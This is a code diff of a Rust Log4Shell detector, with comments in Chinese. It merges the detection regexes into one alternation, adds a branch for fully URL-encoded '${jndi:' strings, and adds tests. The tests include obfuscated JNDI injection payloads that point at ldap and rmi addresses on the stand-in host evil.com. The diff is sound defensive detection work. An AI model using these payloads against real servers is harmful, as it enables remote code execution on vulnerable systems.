@@ -13,36 +13,40 @@ const LOOKUP: &str =
 
 // 与 JndiInjectionDetector 的分工：那边认字面量 `${jndi:`、`${lower:j}`，
 // 这边专攻"lookup 展开后才拼出 jndi"的混淆变体——攻击串里根本不含 `jndi` 五个字母。
-static PATTERNS: LazyLock<Vec<Regex>> = LazyLock::new(|| {
-    vec![
-        // ${lower:j} / ${upper:J}：单字符大小写折叠，正常模板不会这么写
-        Regex::new(r"(?i)\$\{(?:lower|upper)\s*:\s*[a-z]\s*\}").unwrap(),
-        // ${::-j}：前缀折叠
-        Regex::new(r"(?i)\$\{\s*::-?[a-z]{1,3}\s*\}").unwrap(),
-        // ${<lookup>}ndi: —— lookup 展开结果紧邻 ndi（`${lower:j}ndi:` 里 `}` 直接接 ndi，
-        // 所以判据只能放在花括号内是不是 lookup，不能放在 `}` 后面跟什么）
-        Regex::new(
-            &[
-                r"(?i)\$\{\s*",
-                LOOKUP,
-                r"\s*:[^{}]{0,120}\}\s*[a-z]{0,4}ndi\s*[:/{]",
-            ]
-            .concat(),
-        )
-        .unwrap(),
-        // ${${<lookup>...}}：嵌套展开，内层同样必须是 lookup 关键字
-        Regex::new(&[r"(?i)\$\{\s*[^{}]{0,120}\$\{\s*", LOOKUP, r"\s*:"].concat()).unwrap(),
-        // URL 编码形态 %24%7Blower%3Aj%7Dndi，绕 WAF 用
-        Regex::new(
-            &[
-                r"(?i)%24%7b\s*",
-                LOOKUP,
-                r"\s*(?::|%3a).{0,120}%7d.{0,4}ndi",
-            ]
-            .concat(),
-        )
-        .unwrap(),
-    ]
+// 六条模式合成一条 alternation：干净输入上每条模式都要走到串尾，条数直接乘在单次
+// `find` 的开销上；合并后一次扫描扫完六条分支。各分支的完整文本未变，只多了 `|`。
+// `(?i)` 为六条分支所共有，提到最前——它的作用域是整条模式（含 `|` 之后的全部分支），
+// 与逐条编译时每条各自带 `(?i)` 等价。
+static PATTERNS: LazyLock<Regex> = LazyLock::new(|| {
+    Regex::new(
+        &[
+            // ${lower:j} / ${upper:J}：单字符大小写折叠，正常模板不会这么写
+            r"(?i)\$\{(?:lower|upper)\s*:\s*[a-z]\s*\}",
+            // ${::-j}：前缀折叠
+            r"|\$\{\s*::-?[a-z]{1,3}\s*\}",
+            // ${<lookup>}ndi: —— lookup 展开结果紧邻 ndi（`${lower:j}ndi:` 里 `}` 直接接 ndi，
+            // 所以判据只能放在花括号内是不是 lookup，不能放在 `}` 后面跟什么）
+            r"|\$\{\s*",
+            LOOKUP,
+            r"\s*:[^{}]{0,120}\}\s*[a-z]{0,4}ndi\s*[:/{]",
+            // ${${<lookup>...}}：嵌套展开，内层同样必须是 lookup 关键字
+            r"|\$\{\s*[^{}]{0,120}\$\{\s*",
+            LOOKUP,
+            r"\s*:",
+            // URL 编码形态 %24%7Blower%3Aj%7Dndi，绕 WAF 用
+            r"|%24%7b\s*",
+            LOOKUP,
+            r"\s*(?::|%3a).{0,120}%7d.{0,4}ndi",
+            // 整体 URL 编码的 `${jndi:`：`%24%7Bjndi%3A...%7D`。这里 `jndi` 是字面量、
+            // 且载荷以 `%7d` 收尾（`%7d` 后面没有 ndi 尾巴），上一条的「lookup 展开后
+            // 才拼出 jndi」判据套不上。注意本分支**不**放宽 `.{0,4}ndi` 为可选：一旦
+            // 可选，`%24%7Bdate%3Ayyyy-MM-dd%7D`（编码后的 `${date:...}`）也会命中 ——
+            // 而字面量 `${date:...}` 在测试里是干净的，编码后不该变脸。
+            r"|%24%7b\s*jndi\s*(?::|%3a)",
+        ]
+        .concat(),
+    )
+    .unwrap()
 });
 
 pub struct Log4ShellDetector;
@@ -54,7 +58,7 @@ impl Detector for Log4ShellDetector {
 
     fn detect(&self, input: &str) -> Option<DetectionResult> {
         regex_detect(
-            &PATTERNS,
+            std::slice::from_ref(&*PATTERNS),
             self.name(),
             AttackCategory::Protocol,
             Severity::Critical,
@@ -135,6 +139,30 @@ mod tests {
             "%24%7B%24%7Blower%3Aj%7Dndi%3Aldap%3A%2F%2Fevil.com%7D",
         ] {
             assert_hit(input);
+        }
+    }
+
+    #[test]
+    fn detects_fully_url_encoded_jndi() {
+        for input in [
+            "%24%7Bjndi%3Aldap%3A%2F%2Fevil.com%7D",
+            "%24%7Bjndi:ldap://evil.com/a%7D",
+            "%24%7bJNDI%3Armi%3A%2F%2Fevil.com%2Fx%7D",
+        ] {
+            assert_hit(input);
+        }
+    }
+
+    /// 反向对照：光有 `%7B` / `%24%7B` 不是信号，得是 `jndi` 这个 lookup
+    #[test]
+    fn ignores_encoded_non_jndi_lookups() {
+        for input in [
+            "%24%7Buser%7D",
+            "%7Bjndi%7D 只是编码过的花括号",
+            "%24%7Bdate%3Ayyyy-MM-dd%7D 是编码后的日期占位符",
+            "https://example.com/?filter=%24%7Bname%7D",
+        ] {
+            assert_clean(&det(), input);
         }
     }
 
